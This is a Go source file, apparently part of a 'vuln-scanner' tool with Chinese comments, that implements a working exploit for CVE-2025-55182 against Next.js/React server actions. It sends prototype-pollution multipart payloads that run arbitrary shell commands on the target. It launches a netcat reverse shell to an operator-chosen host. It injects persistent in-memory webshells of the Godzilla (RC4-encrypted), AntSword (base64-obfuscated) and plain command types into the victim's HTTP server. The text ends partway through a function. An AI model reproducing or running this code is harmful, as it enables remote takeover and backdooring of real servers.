package vulns

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	ra "math/rand"
	"mime/multipart"
	"net/http"
	"net/url"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf16"
	cli "vuln-scanner/client"
	"vuln-scanner/common"
	"vuln-scanner/logger"
	"vuln-scanner/utils"
)

// CVE202555182Scanner CVE-2025-55182漏洞扫描器
type CVE202555182Scanner struct {
	statistics ScanStatistics
	startTime  time.Time
}

// NewCVE202555182Scanner 创建扫描器
func NewCVE202555182Scanner() *CVE202555182Scanner {
	return &CVE202555182Scanner{}
}

func (s *CVE202555182Scanner) GetScannerName() string {
	return "cve_2025_55182_scanner"
}

func (s *CVE202555182Scanner) GetSupportedVulnerabilities() []string {
	return []string{"CVE-2025-55182"}
}

func (s *CVE202555182Scanner) GetScanStatistics() ScanStatistics {
	if s.statistics.ScanDuration == 0 && !s.startTime.IsZero() {
		s.statistics.ScanDuration = time.Since(s.startTime)
	}
	return s.statistics
}

// ExecuteCommand 执行命令
func (s *CVE202555182Scanner) ExecuteCommand(target string, command string, options ScanOptions) (string, error) {
	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}

	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	log.Info("开始CVE-2025-55182漏洞扫描", baseCtx)

	// 创建HTTP客户端
	clientConfig := cli.HTTPClientConfig{
		Timeout:   time.Duration(options.Timeout) * time.Second,
		Proxy:     options.Proxy,
		SkipSSL:   options.SkipSSL,
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		Headers:   options.Headers,
		Cookies:   options.Cookies,
	}

	client, err := cli.NewHTTPClient(clientConfig)
	if err != nil {
		return "", fmt.Errorf("创建HTTP客户端失败: %w", err)
	}

	// 生成随机路径
	randomPath := "/" + s.generateRandomString(6)
	log.LogScanStep("生成随机路径", map[string]interface{}{
		"randomPath": randomPath,
	}, baseCtx)

	// 构建完整的请求URL
	targetURL, err := s.buildFullURL(target)
	if err != nil {
		log.Error("构建完整URL失败", err, baseCtx)
		return "", err
	}

	boundary := s.generateRandomString(32)

	// 构造JavaScript代码（使用Unicode编码）
	jsCode := fmt.Sprintf("try { var res = process.mainModule.require('child_process').execSync('%s').toString('base64'); } catch(e) { var res = 'ERROR'; } throw Object.assign(new Error('x'),{digest:res});", command)
	jsCodeUnicode := s.stringToUnicode(jsCode)

	// 构建请求体
	body := s.buildMultipartBody(boundary, jsCodeUnicode)

	// 构建完整URL
	fullURL := strings.TrimRight(targetURL, "/") + randomPath

	// headers
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Content-Length":  fmt.Sprintf("%d", len(body)),
		"Content-Type":    fmt.Sprintf("multipart/form-data; boundary=%s", boundary),
		"Accept-Encoding": "gzip, deflate",
		"Next-Action":     "x",
	}

	res, err := http.NewRequest(http.MethodPost, fullURL, strings.NewReader(body))
	if err != nil {
		return "", err
	}

	// 设置headers
	for k, v := range headers {
		res.Header.Set(k, v)
	}

	resp, err := client.Do(res)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	// 检查是否是gzip压缩的响应
	contentEncoding := resp.Header.Get("Content-Encoding")
	if strings.Contains(strings.ToLower(contentEncoding), "gzip") {
		// 解压gzip响应
		reader, err := gzip.NewReader(bytes.NewReader(bodyBytes))
		if err != nil {
			return "", err
		}
		defer reader.Close()

		bodyBytes, err = io.ReadAll(reader)
		if err != nil {
			return "", err
		}
	}

	digestValue := s.extractDigestValue(string(bodyBytes))
	if digestValue == "" {
		return "", fmt.Errorf("未找到digest值")
	}

	decodedStr := ""
	if digestValue != "" {
		decoded, err := base64.StdEncoding.DecodeString(digestValue)
		if err == nil {
			decodedStr = string(decoded)
		}
	}

	return decodedStr, nil
}

// 构建反弹shell的payload
type RevPayload struct {
	Then     string `json:"then"`
	Status   string `json:"status"`
	Reason   int    `json:"reason"`
	Value    string `json:"value"`
	Response struct {
		Prefix   string `json:"_prefix"`
		FormData struct {
			Get string `json:"get"`
		} `json:"_formData"`
	} `json:"_response"`
}

// 构建payload
func buildPayload(command string) RevPayload {
	payload := RevPayload{}
	payload.Then = "$1:__proto__:then"
	payload.Status = "resolved_model"
	payload.Reason = -1
	payload.Value = `{"then": "$B0"}`
	payload.Response.Prefix = fmt.Sprintf("process.mainModule.require('child_process').execSync('%s');", command)
	payload.Response.FormData.Get = "$1:constructor:constructor"

	return payload
}

// 构建multipart请求体
func buildMultipartRequest(baseURL string, payload RevPayload) (*http.Request, error) {
	// 创建multipart缓冲区
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// 添加第一个文件字段 "0"
	part1, err := writer.CreateFormField("0")
	if err != nil {
		return nil, fmt.Errorf("创建表单字段0失败: %w", err)
	}

	// 序列化payload为JSON
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("序列化payload失败: %w", err)
	}

	_, err = part1.Write(payloadJSON)
	if err != nil {
		return nil, fmt.Errorf("写入字段0失败: %w", err)
	}

	// 添加第二个文件字段 "1"
	part2, err := writer.CreateFormField("1")
	if err != nil {
		return nil, fmt.Errorf("创建表单字段1失败: %w", err)
	}

	_, err = part2.Write([]byte(`"$@0"`))
	if err != nil {
		return nil, fmt.Errorf("写入字段1失败: %w", err)
	}

	// 关闭multipart writer
	err = writer.Close()
	if err != nil {
		return nil, fmt.Errorf("关闭multipart写入器失败: %w", err)
	}

	// 创建HTTP请求
	req, err := http.NewRequest("POST", baseURL, body)
	if err != nil {
		return nil, fmt.Errorf("创建HTTP请求失败: %w", err)
	}

	// 设置请求头
	req.Header.Set("Next-Action", "x")
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", "React2Shell-Go/1.0")

	return req, nil
}

// StartReverseShell 启动反弹shell
func (s *CVE202555182Scanner) StartReverseShell(target string, host string, port string, options ScanOptions) (string, error) {
	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}

	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	httpClient, err := cli.CreateHTTPClient(options.Proxy, options.SkipSSL, options.AllowRedirect, time.Duration(options.Timeout)*time.Second)
	if err != nil {
		return "", fmt.Errorf("创建HTTP客户端失败: %w", err)
	}

	log.LogScanStep("开始CVE-2025-55182反弹shell", map[string]interface{}{
		"target": target,
		"lhost":  host,
		"lport":  port,
	}, baseCtx)

	command := fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f", host, port)
	// reveseShell := fmt.Sprintf("process.mainModule.require('child_process').execSync('%s');", command)
	log.LogScanStep("生成反弹shell命令", map[string]interface{}{
		"command": command,
	}, baseCtx)

	payload := buildPayload(command)
	target = strings.TrimRight(target, "/")
	res, err := buildMultipartRequest(target, payload)
	if err != nil {
		return "", fmt.Errorf("创建HTTP请求失败: %w", err)
	}
	log.LogScanStep("发送反弹shell请求", map[string]interface{}{
		"target":  target,
		"payload": payload,
	}, baseCtx)
	go func(res *http.Request) {
		_, _ = httpClient.Do(res)
	}(res)

	return fmt.Sprintf("Shell反弹请求已发送,请检查你的Netcat监听结果。\n监听地址: %s:%s\n\n提示：\n1. 反弹shell命令已启动\n2. 如果连接成功，你应该能在netcat中看到shell提示符\n3. 请确保你的监听端口是开放的\n", host, port), nil
}

func (s *CVE202555182Scanner) generateGodzillaMemoryShell(payloadName, actionHash, secretKey, checkCode string) string {
	memoryShellTemplate := `(async()=>{async function getRawBody(req){const chunks=[];for await(const chunk of req){chunks.push(chunk)}return Buffer.concat(chunks)}const http=await import('node:http');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=async function(event,...args){if(event==='request'){const[req,res]=args;if(req.headers['next-action']==='{actionHash}'){function rc4(key,data){const s=Array(256),k=Array(256);let i,j=0,tmp;for(i=0;i<256;i++){s[i]=i;k[i]=key.charCodeAt(i%key.length)}for(i=0;i<256;i++){j=(j+s[i]+k[i])%256;tmp=s[i];s[i]=s[j];s[j]=tmp}i=j=0;let out=Buffer.alloc(data.length);for(let idx=0;idx<data.length;idx++){i=(i+1)%256;j=(j+s[i])%256;tmp=s[i];s[i]=s[j];s[j]=tmp;const t=(s[i]+s[j])%256;out[idx]=data[idx]^s[t]}return out}try{const g=globalThis||self||window||global||Function('return this')();let rawBody=await getRawBody(req);if(rawBody.length>0){const key='{secretKey}';rawBody=Buffer.from(JSON.parse(rawBody.toString()).data,'base64');rawBody=rc4(key,rawBody);if(g.{payloadName}===undefined){const tmpPayload=new Function(rawBody.toString())();if(typeof tmpPayload==='object'&&typeof tmpPayload.process==='function'){g.{payloadName}=tmpPayload}}if(g.{payloadName}!==undefined){const result=rc4(key,await g.{payloadName}['process'].call(g.{payloadName},rawBody));res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({'data':result.toString('base64')}));return true}}}catch{}}}return originalEmit.apply(this,arguments)}})();throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'{checkCode}'});`
	// 使用 strings.Replacer（推荐，性能更好）
	// 替换占位符
	memoryShell := strings.ReplaceAll(memoryShellTemplate, "{payloadName}", payloadName)
	memoryShell = strings.ReplaceAll(memoryShell, "{actionHash}", actionHash)
	memoryShell = strings.ReplaceAll(memoryShell, "{secretKey}", secretKey)
	memoryShell = strings.ReplaceAll(memoryShell, "{checkCode}", checkCode)
	return memoryShell
}

// GenerateAntSwordShell 单方法生成蚁剑马（Node.js环境，完全按照数据包结构）
// path：后门访问路径（如"/shellpcgk"）
// pwdKey：连接密码key（如"d1i3j5"）
func (s *CVE202555182Scanner) generateAntSwordMemoryShell(path, pwdKey string) string {
	// Base64编码路径和密码
	pathB64 := base64.StdEncoding.EncodeToString([]byte(path))
	passwordB64 := base64.StdEncoding.EncodeToString([]byte(pwdKey))

	// 构建完整的JSON结构，与数据包完全一致
	fullAntSword := fmt.Sprintf(`{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"(async () => {const R = process.mainModule[Buffer.from('cmVxdWlyZQ==', 'base64').toString()];const B = R(Buffer.from('YnVmZmVy', 'base64').toString())['Buffer'];const H = R(B.from('aHR0cA==', B.from('YmFzZTY0', 'base64').toString()).toString());const U = R(B.from('dXJs', B.from('YmFzZTY0', 'base64').toString()).toString());const C = R(B.from('Y2hpbGRfcHJvY2Vzcw==', B.from('YmFzZTY0', 'base64').toString()).toString());const oE = H.Server.prototype['emit'];H.Server.prototype['emit'] = function(e, ...a) {if (e === B.from('cmVxdWVzdA==', 'base64').toString('utf8')) {const [r, s] = a;const pU = U.parse(r.url, true);if (r.method === B.from('UE9TVA==', 'base64').toString('utf8') && pU.pathname === B.from('%s', 'base64').toString('utf8')) {let d = '';r.on('data', c => {d += c.toString();});r.on('end', () => {let eC = '';const m = d.match(new RegExp(B.from('%s', 'base64').toString('utf8') + '=([^&]*)'));if (m && m[1]) {eC = decodeURIComponent(m[1]);}if (!eC) {s.writeHead(400);s.end();return;}let c = '';try {c = B.from(eC, 'base64').toString('utf8');} catch (err) {s.writeHead(500);s.end('Decode Failed');return;}C['exec'](c, { encoding: B.from('dXRmOA==', 'base64').toString('utf8') }, (er, o, de) => {let out = o || '';if (er) {out = de || 'Execution Error: ' + er.message;}const rawOutput = out;s.writeHead(200, { 'Content-Type': B.from('dGV4dC9wbGFpbjsgY2hhcnNldD11dGYtOA==', 'base64').toString('utf8'), 'Connection': 'close' });s.end(rawOutput);});});return true;}}return oE.apply(this, arguments);};})();","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`, pathB64, passwordB64)

	return fullAntSword
}

func (s *CVE202555182Scanner) generateCmdMemoryShell(path string) string {
	cmdmemshell := fmt.Sprintf(`(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='/%s'){const cmd=parsedUrl.query.cmd||'whoami';cp.exec(cmd,(err,stdout,stderr)=>{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));});return true;}}return originalEmit.apply(this,arguments);};})();`, path)
	return cmdmemshell
}

func (s *CVE202555182Scanner) testCmdMemoryConn(target string, proxyStr string, skipSSL bool, allowRedirect bool, log logger.Logger, baseCtx logger.LogContext) (string, error) {
	// 打印AllowRedirect的值，以便调试
	log.LogScanStep("HTTP客户端配置", map[string]interface{}{
		"URL":           target,
		"Proxy":         proxyStr,
		"SkipSSL":       skipSSL,
		"AllowRedirect": allowRedirect,
	}, baseCtx)

	// 为了确保重定向处理正常工作，这里强制使用允许重定向的客户端
	// 因为我们在函数内部已经实现了手动重定向处理逻辑
	client, err := cli.CreateHTTPClient(proxyStr, skipSSL, true, time.Duration(20*time.Second))
	if err != nil {
		return "", fmt.Errorf("创建 testMemoryConn HTTP客户端失败: %w", err)
	}

	// 发送GET请求
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return "", fmt.Errorf("创建 testMemoryConn HTTP请求失败: %w", err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	startTime := time.Now()
	resp, err := client.Do(req)
	duration := time.Since(startTime)
	if err != nil {
		return "", fmt.Errorf("发送 testMemoryConn HTTP请求失败: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("读取 testMemoryConn 响应体失败: %w", err)
	}

	// 检查响应头中的Location字段，了解重定向目标
	location := resp.Header.Get("Location")
	if location != "" {
		log.LogScanStep("重定向信息", map[string]interface{}{
			"StatusCode": resp.StatusCode,
			"Location":   location,
		},
			baseCtx,
		)
	}

	// 如果是重定向状态码，尝试直接访问重定向目标
	if resp.StatusCode >= 300 && resp.StatusCode < 400 && location != "" {
		log.LogScanStep("尝试访问重定向目标", map[string]interface{}{"URL": location}, baseCtx)

		// 确保重定向URL是完整的
		redirectURL := location
		if !strings.HasPrefix(location, "http://") && !strings.HasPrefix(location, "https://") {
			// 如果是相对路径，使用原始URL的基础部分
			baseURL, err := url.Parse(target)
			if err == nil {
				base := baseURL.Scheme + "://" + baseURL.Host
				if strings.HasPrefix(location, "/") {
					redirectURL = base + location
				} else {
					path := filepath.Dir(baseURL.Path)
					if !strings.HasSuffix(path, "/") {
						path += "/"
					}
					redirectURL = base + path + location
				}
			}
		}

		// 创建新的请求访问重定向目标
		// 对于308状态码，保持原始请求方法
		redirectReq, err := http.NewRequest("GET", redirectURL, nil)
		if err != nil {
			log.LogScanStep("创建重定向请求失败", map[string]interface{}{"Error": err.Error()}, baseCtx)
		} else {
			// 复制原始请求的请求头
			for key, values := range req.Header {
				for _, value := range values {
					redirectReq.Header.Add(key, value)
				}
			}

			redirectStartTime := time.Now()
			redirectResp, err := client.Do(redirectReq)
			redirectDuration := time.Since(redirectStartTime)
			if err != nil {
				log.LogScanStep("发送重定向请求失败", map[string]interface{}{"Error": err.Error()}, baseCtx)
			} else {
				defer redirectResp.Body.Close()

				redirectBody, err := io.ReadAll(redirectResp.Body)
				if err != nil {
					log.LogScanStep("读取重定向响应体失败", map[string]interface{}{"Error": err.Error()}, baseCtx)
				} else {
					log.LogResponse(redirectResp.StatusCode, utils.HeaderMap(redirectResp.Header), redirectBody, redirectDuration, baseCtx)

					if redirectResp.StatusCode == http.StatusOK && strings.Contains(string(redirectBody), "success") {
						return fmt.Sprintf("CMD内存马注入成功:\n访问地址: %s\n响应内容: %s", redirectURL, string(redirectBody)), nil
					}

					// 如果重定向后仍然是重定向状态码，递归处理
					if redirectResp.StatusCode >= 300 && redirectResp.StatusCode < 400 {
						redirectLocation := redirectResp.Header.Get("Location")
						if redirectLocation != "" {
							log.LogScanStep("再次重定向", map[string]interface{}{
								"StatusCode": redirectResp.StatusCode,
								"Location":   redirectLocation,
							},
								baseCtx,
							)

							// 确保再次重定向的URL是完整的
							finalRedirectURL := redirectLocation
							if !strings.HasPrefix(redirectLocation, "http://") && !strings.HasPrefix(redirectLocation, "https://") {
								baseURL, err := url.Parse(redirectURL)
								if err == nil {
									base := baseURL.Scheme + "://" + baseURL.Host
									if strings.HasPrefix(redirectLocation, "/") {
										finalRedirectURL = base + redirectLocation
									} else {
										path := filepath.Dir(baseURL.Path)
										if !strings.HasSuffix(path, "/") {
											path += "/"
										}
										finalRedirectURL = base + path + redirectLocation
									}
								}
							}

							// 第三次尝试：访问最终重定向目标
							finalReq, err := http.NewRequest("GET", finalRedirectURL, nil)
							if err != nil {
								log.LogScanStep("创建最终重定向请求失败", map[string]interface{}{"Error": err.Error()}, baseCtx)
							} else {
								// 复制请求头
								for key, values := range req.Header {
									for _, value := range values {
										finalReq.Header.Add(key, value)
									}
								}

								finalStartTime := time.Now()
								finalResp, err := client.Do(finalReq)
								finalDuration := time.Since(finalStartTime)
								if err != nil {
									log.LogScanStep("发送最终重定向请求失败", map[string]interface{}{"Error": err.Error()}, baseCtx)
								} else {
									defer finalResp.Body.Close()

									finalBody, err := io.ReadAll(finalResp.Body)
									if err != nil {
										log.LogScanStep("读取最终重定向响应体失败", map[string]interface{}{"Error": err.Error()}, baseCtx)
									} else {
										log.LogResponse(finalResp.StatusCode, utils.HeaderMap(finalResp.Header), finalBody, finalDuration, baseCtx)

										if finalResp.StatusCode == http.StatusOK && strings.Contains(string(finalBody), "success") {
											return fmt.Sprintf("CMD内存马注入成功:\n访问地址: %s\n响应内容: %s", finalRedirectURL, string(finalBody)), nil
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}

	if resp.StatusCode == http.StatusOK && strings.Contains(string(body), "success") {
		log.LogResponse(resp.StatusCode, utils.HeaderMap(resp.Header), body, duration, baseCtx)
		return fmt.Sprintf("CMD内存马注入成功!\n[+] 访问地址: %s\n[+] 响应内容: %s", target, string(body)), nil
	} else {
		log.LogResponse(resp.StatusCode, utils.HeaderMap(resp.Header), body, duration, baseCtx)
		return "", fmt.Errorf("testMemoryConn 响应状态码错误: %d", resp.StatusCode)
	}
}

// GetSupportedFeatures 获取支持的功能
func (s *CVE202555182Scanner) GetSupportedFeatures() []string {
	return []string{"command", "shell", "memory"}
}

// GetMemoryShellTypes 获取支持的内存马类型
func (s *CVE202555182Scanner) GetMemoryShellTypes() ([]map[string]string, error) {
	return []map[string]string{
		{"value": "godzilla", "label": "哥斯拉内存马"},
		{"value": "antsword", "label": "蚁剑内存马"},
		{"value": "cmd", "label": "CMD内存马"},
	}, nil
}

// InjectMemoryShell 注入内存马
func (s *CVE202555182Scanner) InjectMemoryShell(target string, password string, path string, shellType string, options ScanOptions) (string, error) {
	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}

	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	httpClient, err := cli.CreateHTTPClient(options.Proxy, options.SkipSSL, options.AllowRedirect, 30*time.Second)
	if err != nil {
		return "", fmt.Errorf("创建HTTP客户端失败: %w", err)
	}

	// 清理路径参数
	path = strings.TrimPrefix(path, "/")
	if path == "" {
		path = "deep"
	}

	// 解析目标URL
	parsedURL, err := url.Parse(target)
	if err != nil {
		return "", fmt.Errorf("解析URL失败: %w", err)
	}

	type memoryShellResult struct {
		name   string
		url    string
		result string
		key    string
		pass   string
		header string
		err    error
	}

	rsChan := make(chan memoryShellResult, 1)

	// 根据选择的内存马类型执行相应的注入
	switch shellType {
	case "godzilla":
		go func() {
			log.LogScanStep("开始注入哥斯拉内存马", map[string]interface{}{
				"target": target,
			}, baseCtx)

			key := password // 哥斯拉内存马秘钥
			// 生成secret key
			md5Hash := md5.Sum([]byte(key))
			secretKey := hex.EncodeToString(md5Hash[:])[:16]
			// 生成action hash
			sha1Hash := sha1.Sum([]byte(key))
			actionHash := hex.EncodeToString(sha1Hash[:])

			// 生成随机payload名称和checkCode
			ra.Seed(time.Now().UnixNano())
			payloadName := "a" + s.generateRandomString(5)
			checkCode := "QAXNB12138"

			godzillaMemoryShell := s.generateGodzillaMemoryShell(payloadName, actionHash, secretKey, checkCode)
			log.LogScanStep("生成哥斯拉内存马payload", map[string]interface{}{
				"payloadName": payloadName,
				"checkCode":   checkCode,
				"memoryShell": godzillaMemoryShell,
			}, baseCtx)

			godzillaCraftedChunk := map[string]interface{}{
				"then":   "$1:__proto__:then",
				"status": "resolved_model",
				"reason": -1,
				"value":  `{"then": "$B0"}`,
				"_response": map[string]interface{}{
					"_prefix": godzillaMemoryShell,
					"_formData": map[string]interface{}{
						"get": "$1:constructor:constructor",
					},
				},
			}

			// 构建files参数
			craftedChunkJSON, _ := json.Marshal(godzillaCraftedChunk)
			files := map[string]string{
				"0": string(craftedChunkJSON),
				"1": `"$@0"`,
			}

			// 创建multipart请求体
			var body bytes.Buffer
			writer := multipart.NewWriter(&body)

			// 添加文件字段
			for key, value := range files {
				part, err := writer.CreateFormField(key)
				if err != nil {
					rsChan <- memoryShellResult{
						name:   "哥斯拉内存马",
						url:    target + path,
						result: "失败",
						key:    key,
						pass:   password,
						header: "",
						err:    fmt.Errorf("创建multipart字段失败: %w", err),
					}
					return
				}
				part.Write([]byte(value))
			}

			writer.Close()

			// 构造新的的URL
			baseURL := &url.URL{
				Scheme: parsedURL.Scheme,
				Host:   parsedURL.Host,
			}

			// 生成URL字符串并去除尾部斜杠
			target = baseURL.String()

			if !strings.HasPrefix(path, "/") {
				path = fmt.Sprintf("/%s", path)
			}

			fullURL := target + path

			req, err := http.NewRequest("POST", fullURL, &body)
			if err != nil {
				rsChan <- memoryShellResult{
					name:   "哥斯拉内存马",
					url:    fullURL,
					result: "失败",
					key:    key,
					pass:   password,
					header: "",
					err:    fmt.Errorf("创建HTTP请求失败: %w", err),
				}
				return
			}

			req.Header.Set("Content-Type", writer.FormDataContentType())
			req.Header.Set("Next-Action", actionHash)

			if options.RandomAgent {
				req.Header.Set("User-Agent", cli.GetRandomUserAgent())
			}

			log.LogRequest("POST", fullURL, utils.HeaderMap(req.Header), body.Bytes(), baseCtx)

			resp, err := httpClient.Do(req)
			if err != nil {
				rsChan <- memoryShellResult{
					name:   "哥斯拉内存马",
					url:    fullURL,
					result: "失败",
					key:    key,
					pass:   password,
					header: fmt.Sprintf("Next-Action: %s", actionHash),
					err:    fmt.Errorf("发送HTTP请求失败: %w", err),
				}
				return
			}
			defer resp.Body.Close()

			bodyBytes, _ := io.ReadAll(resp.Body)
			log.LogResponse(resp.StatusCode, utils.HeaderMap(resp.Header), bodyBytes, 1, baseCtx)

			if strings.Contains(string(bodyBytes), checkCode) {
				rc4ShellURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
				rsChan <- memoryShellResult{
					name:   "哥斯拉内存马",
					url:    rc4ShellURL,
					result: "哥斯拉内存马注入成功",
					key:    key,
					pass:   "pass",
					header: fmt.Sprintf("Next-Action: %s", actionHash),
					err:    nil,
				}
				return
			}

			rsChan <- memoryShellResult{
				name:   "哥斯拉内存马",
				url:    fullURL,
				result: "失败",
				key:    key,
				pass:   password,
				header: fmt.Sprintf("Next-Action: %s", actionHash),
				err:    fmt.Errorf("哥斯拉内存马注入失败，未检测到校验码"),
			}
		}()

	case "antsword":
		go func() {
			path = fmt.Sprintf("/%s", path)
			antswordMemoryshell := s.generateAntSwordMemoryShell(path, password)
			// 开始注入蚁剑马
			log.LogScanStep("生成蚁剑内存马payload", map[string]interface{}{
				"payloadName":         "antswordMemoryshell",
				"target":              target,
				"path":                path,
				"password":            password,
				"antswordMemoryshell": antswordMemoryshell,
			}, baseCtx)

			// 构建files参数，使用有序的切片来确保字段顺序与数据包一致
			type formField struct {
				key   string
				value string
			}
			files := []formField{
				{key: "0", value: antswordMemoryshell},
				{key: "1", value: `"$@0"`},
				{key: "2", value: `[]`},
			}

			// 构建multipart/form-data
			body := &bytes.Buffer{}
			writer := multipart.NewWriter(body)

			for _, field := range files {
				part, err := writer.CreateFormField(field.key)
				if err != nil {
					rsChan <- memoryShellResult{
						name:   "蚁剑内存马",
						url:    target,
						result: "失败",
						key:    "",
						pass:   password,
						header: "",
						err:    fmt.Errorf("创建multipart字段失败: %w", err),
					}
					return
				}
				part.Write([]byte(field.value))
			}

			writer.Close()

			// 构造新的的URL
			baseURL := &url.URL{
				Scheme: parsedURL.Scheme,
				Host:   parsedURL.Host,
			}

			// 生成URL字符串并去除尾部斜杠
			target = baseURL.String()
			p := utils.RandomNumberString(6)
			fullURL := fmt.Sprintf("%s/%s", target, p)

			log.LogScanStep("发送蚁剑内存马payload", map[string]interface{}{
				"target":              fullURL,
				"path":                p,
				"password":            password,
				"antswordMemoryshell": antswordMemoryshell,
			}, baseCtx)
			req, err := http.NewRequest("POST", fullURL, body)
			if err != nil {

			}

			// 设置headers，与数据包一致
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
			req.Header.Set("Next-Action", "x")
			req.Header.Set("Connection", "close")
			req.Header.Set("Accept-Encoding", "gzip, deflate")
			req.Header.Set("Content-Type", writer.FormDataContentType())
			log.LogRequest("POST", fullURL, utils.HeaderMap(req.Header), body.Bytes(), baseCtx)
			// 构建蚁剑内存马URL
			// start := time.Now()
			go func() {
				_, _ = httpClient.Do(req)
			}()

			// 减少等待时间，因为我们有重试机制
			time.Sleep(2 * time.Second)

			maxRetries := 3
			retryInterval := 2 * time.Second
			anturl := fmt.Sprintf("%s%s", target, path)
			for i := 0; i < maxRetries; i++ {
				command := "echo QAXNB12138"
				antBody := fmt.Sprintf("%s=%s", password, url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(command))))
				antReq, err := http.NewRequest(http.MethodPost, anturl, strings.NewReader(antBody))
				if err != nil {
					rsChan <- memoryShellResult{
						name:   "蚁剑内存马",
						url:    anturl,
						result: "失败",
						key:    "",
						pass:   password,
						header: "",
						err:    fmt.Errorf("创建HTTP请求失败: %w", err),
					}
					return
				}
				antReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36")
				antReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				log.LogScanStep(fmt.Sprintf("验证蚁剑内存马 (尝试 %d/%d)", i+1, maxRetries), map[string]interface{}{
					"target": anturl,
					"path":   path,
					"body":   antBody,
				}, baseCtx)

				log.LogRequest("POST", fullURL, utils.HeaderMap(antReq.Header), []byte(antBody), baseCtx)
				start := time.Now()
				antResp, err := httpClient.Do(antReq)
				duration := time.Since(start)
				if err != nil {
					rsChan <- memoryShellResult{
						name:   "蚁剑内存马",
						url:    anturl,
						result: "失败",
						key:    "",
						pass:   password,
						header: "",
						err:    fmt.Errorf("发送HTTP请求失败: %w", err),
					}
					return
				}
				defer antResp.Body.Close()
				antBodyBytes, _ := io.ReadAll(antResp.Body)
				log.LogResponse(antResp.StatusCode, utils.HeaderMap(antResp.Header), antBodyBytes, duration, baseCtx)

				if antResp.StatusCode == http.StatusOK && strings.Contains(string(antBodyBytes), "QAXNB12138") {
					rsChan <- memoryShellResult{
						name:   "蚁剑内存马",
						url:    anturl,
						result: "蚁剑内存马注入成功",
						key:    "",
						pass:   password,
						header: "",
						err:    nil,
					}
					return
				}

				if i == maxRetries-1 {
					rsChan <- memoryShellResult{
						name:   "蚁剑内存马",
						url:    anturl,
						result: "失败",
						key:    "",
						pass:   password,
						header: "",
						err:    fmt.Errorf("未检测到校验码"),
					}
					return
				}
				time.Sleep(retryInterval)
			}
		}()

	case "cmd":
		go func() {
			log.LogScanStep("开始注入CMD内存马", map[string]interface{}{
				"target": target,
				"path":   path,
			}, baseCtx)

			cmdmemshell := fmt.Sprintf(`(async()=>{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='/%s'){const cmd=parsedUrl.query.cmd||'whoami';cp.exec(cmd,(err,stdout,stderr)=>{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));});return true;}}return originalEmit.apply(this,arguments);};})();`, path)

			boundary := s.generateRandomString(32)
			cmdmemshellUnicode := s.stringToUnicode(cmdmemshell)
			bodyContent := s.buildMultipartBody(boundary, cmdmemshellUnicode)

			randomPath := utils.RandomString(8)
			attackURL := fmt.Sprintf("%s://%s/%s", parsedURL.Scheme, parsedURL.Host, randomPath)

			req, err := http.NewRequest("POST", attackURL, strings.NewReader(bodyContent))
			if err != nil {
				rsChan <- memoryShellResult{
					name:   "CMD内存马",
					url:    attackURL,
					result: "失败",
					key:    "",
					pass:   password,
					header: "",
					err:    fmt.Errorf("创建HTTP请求失败: %w", err),
				}
				return
			}

			contentType := fmt.Sprintf("multipart/form-data; boundary=%s", boundary)
			req.Header.Set("Content-Type", contentType)
